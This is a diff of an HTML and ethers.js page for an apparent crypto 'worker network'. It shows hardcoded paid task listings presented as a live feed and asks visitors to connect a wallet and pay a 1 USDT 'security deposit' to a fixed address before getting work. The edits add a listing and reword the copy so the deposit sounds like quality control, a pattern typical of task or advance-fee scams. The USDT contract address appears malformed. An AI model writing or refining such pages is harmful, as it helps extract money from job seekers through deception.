@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Worker Portal - Integrated</title>
+    <title>Worker Portal - Full Integration</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
 
     <style>
@@ -10,12 +10,14 @@
         .container {max-width:800px;margin:auto;padding:20px;}
         .card {background:#141a22;padding:20px;margin-top:20px;border-radius:12px;border: 1px solid #252e3a;}
         
-        /* 按钮样式整合 */
+        /* 按钮与交互样式 */
         .btn-primary {
             width:100%; padding:14px; background:#00ffae; border:none; border-radius:10px; 
             cursor:pointer; color: #0b0f14; font-weight: bold; font-size: 16px; transition: 0.3s;
         }
         .btn-primary:hover { background: #00d4ff; box-shadow: 0 0 15px rgba(0,255,174,0.4); }
+        .btn-primary:disabled { background: #444; color: #888; cursor: not-allowed; }
+        
         .btn-secondary {
             width:100%; padding:10px; margin-top:10px; background:#1e2630; color:#00d4ff; 
             border:1px solid #00d4ff; border-radius:8px; cursor:pointer;
@@ -24,7 +26,7 @@
         .task { border-bottom:1px solid #333; padding:10px 0; }
         .highlight {color:#00ffae;}
         #portal-section { display: none; margin-top: 40px; border-top: 2px dashed #333; padding-top: 20px; }
-        .status-msg { margin-top: 10px; font-size: 14px; color: #888; }
+        .status-msg { margin-top: 15px; font-size: 14px; color: #00ffae; font-weight: bold; text-align: center; }
     </style>
 </head>
 
@@ -54,9 +56,10 @@
         </div>
 
         <div class="card">
-            <h2>🔥 Open Tasks</h2>
+            <h2>🔥 Open Tasks (Live Feed)</h2>
             <div class="task">📍 Jakarta – Take site photos | Reward: $20</div>
             <div class="task">📍 Mumbai – Find location | Reward: $40</div>
+            <div class="task">📍 Bangkok – Landlord meeting | Reward: $60</div>
         </div>
 
         <div class="card">
@@ -67,34 +70,35 @@
     </section>
 
     <section id="portal-section">
-        <h2 style="color:#00d4ff;">⚙️ Worker Portal</h2>
+        <h2 style="color:#00d4ff;">⚙️ Worker Registration</h2>
         
         <div class="card">
             <h3>Step 1: Authorization</h3>
             <button class="btn-secondary" onclick="connect()">Connect Wallet</button>
-            <div id="wallet" class="status-msg"></div>
+            <div id="wallet" style="margin-top:8px; font-size:12px; color:#888;"></div>
         </div>
 
         <div class="card">
             <h3>Step 2: Security Deposit (Stake 1 USDT)</h3>
-            <p style="font-size: 12px; color: #888;">* Stake $1 to join the worker network.</p>
-            <button class="btn-primary" onclick="stake()">Stake Now</button>
+            <p style="font-size: 12px; color: #888;">* To ensure task quality, a 1 USDT stake is required to activate your worker ID.</p>
+            <button id="stakeBtn" class="btn-primary" onclick="stake()">Stake & Activate ID</button>
             <div id="stakeStatus" class="status-msg"></div>
         </div>
 
         <div class="card">
-            <h3>Step 3: Access Tasks</h3>
-            <button class="btn-secondary" onclick="loadTasks()">Refresh Task List</button>
+            <h3>Step 3: Verification status</h3>
+            <button class="btn-secondary" onclick="loadTasks()">Manual Refresh Tasks</button>
             <div id="tasks" style="margin-top:15px; font-size: 14px;"></div>
         </div>
     </section>
 </div>
 
 <script>
-// ===== 配置信息 =====
+// ===== 合约配置与 ABI =====
 const USDT = "0xC2132D05D31c914a87C6611C10748AaCBdA6C62";
 const SAFE = "0xC8DF3B516616800b2709F66e1bee7520aBAbD4E2";
 const CONTRACT = "0xC93f3483C514a9ba22CdF2240B32734a69Bf17a2";
+
 const ABI = [
   "function stakeFund(uint256 amount)",
   "function tasks(uint256) view returns(address,uint256,uint256,bool)"
@@ -102,67 +106,93 @@ const ABI = [
 
 let provider, signer, user;
 
-// ===== 页面逻辑 =====
+// 显示门户区域并滚动
 function showPortal() {
     document.getElementById('portal-section').style.display = 'block';
-    window.scrollTo(0, document.getElementById('portal-section').offsetTop);
+    window.scrollTo({
+        top: document.getElementById('portal-section').offsetTop,
+        behavior: 'smooth'
+    });
 }
 
-// ===== 核心功能 (由原 newworker.html 整合) =====
+// 连接钱包逻辑
 async function connect(){
   try{
     if (typeof window.ethereum === "undefined") {
-      alert("Please open in a Web3 browser or install MetaMask.");
+      alert("Please install MetaMask or use a Web3 browser.");
       return;
     }
     provider = new ethers.BrowserProvider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
     signer = await provider.getSigner();
     user = await signer.getAddress();
-    document.getElementById("wallet").innerText = "Connected: " + user;
+    document.getElementById("wallet").innerText = "Connected Wallet: " + user;
   } catch(e) {
-    alert("Connect error: " + e.message);
+    console.error(e);
+    alert("Connection failed: " + e.message);
   }
 }
 
+// 第三层流转：Stake 成功后自动跳转 Create Task
 async function stake(){
   try{
-    if(!signer){ alert("Please connect wallet first"); return; }
-    
+    if(!signer){
+      alert("Please connect your wallet in Step 1");
+      return;
+    }
+
+    const stakeBtn = document.getElementById("stakeBtn");
+    stakeBtn.disabled = true;
+    stakeBtn.innerText = "Processing...";
+
     const token = new ethers.Contract(USDT, ["function transfer(address,uint256) returns(bool)"], signer);
     let amount = ethers.parseUnits("1", 6);
 
-    document.getElementById("stakeStatus").innerText = "Processing USDT transfer...";
-    let tx = await token.transfer(SAFE, amount);
-    await tx.wait();
+    // 1. 转账给安全地址
+    document.getElementById("stakeStatus").innerText = "⏳ Step 1/2: Sending 1 USDT Deposit...";
+    let tx1 = await token.transfer(SAFE, amount);
+    await tx1.wait();
 
-    document.getElementById("stakeStatus").innerText = "Recording stake on contract...";
+    // 2. 调用合约记录 Stake
+    document.getElementById("stakeStatus").innerText = "⏳ Step 2/2: Finalizing Worker Activation...";
     const contract = new ethers.Contract(CONTRACT, ABI, signer);
     let tx2 = await contract.stakeFund(amount);
     await tx2.wait();
 
-    document.getElementById("stakeStatus").innerText = "✅ Stake Success! You are now a verified worker.";
+    // 3. 成功反馈并触发自动跳转
+    document.getElementById("stakeStatus").innerText = "✅ ID Activated! Redirecting to Console...";
+    
+    setTimeout(() => {
+        // 自动携带当前 user 地址跳转到 create-task.html
+        window.location.href = `create-task.html?worker=${user}`;
+    }, 2000);
+
   } catch(e) {
+    console.error(e);
     document.getElementById("stakeStatus").innerText = "❌ Error: " + e.message;
+    document.getElementById("stakeBtn").disabled = false;
+    document.getElementById("stakeBtn").innerText = "Retry Stake";
   }
 }
 
+// 任务加载逻辑 (备用/展示)
 async function loadTasks(){
   try{
+    if(!provider) { alert("Connect wallet first"); return; }
     const contract = new ethers.Contract(CONTRACT, ABI, provider);
     let html = "";
-    for(let i=0; i<5; i++){ // 演示展示前5个任务
+    for(let i=0; i<3; i++){
       try {
         let t = await contract.tasks(i);
         html += `<div class="task">
             Task #${i} | Reward: ${Number(ethers.formatUnits(t[1],6))} USDT <br>
-            Status: ${t[3] ? "✅ Available" : "❌ Taken"}
+            Status: ${t[3] ? "✅ Available" : "❌ Processing"}
         </div>`;
       } catch(e) { break; }
     }
-    document.getElementById("tasks").innerHTML = html || "No active tasks found.";
+    document.getElementById("tasks").innerHTML = html || "No additional tasks found.";
   } catch(e) {
-    document.getElementById("tasks").innerText = "❌ Load failed: " + e.message;
+    document.getElementById("tasks").innerText = "❌ Load error: " + e.message;
   }
 }
 </script>
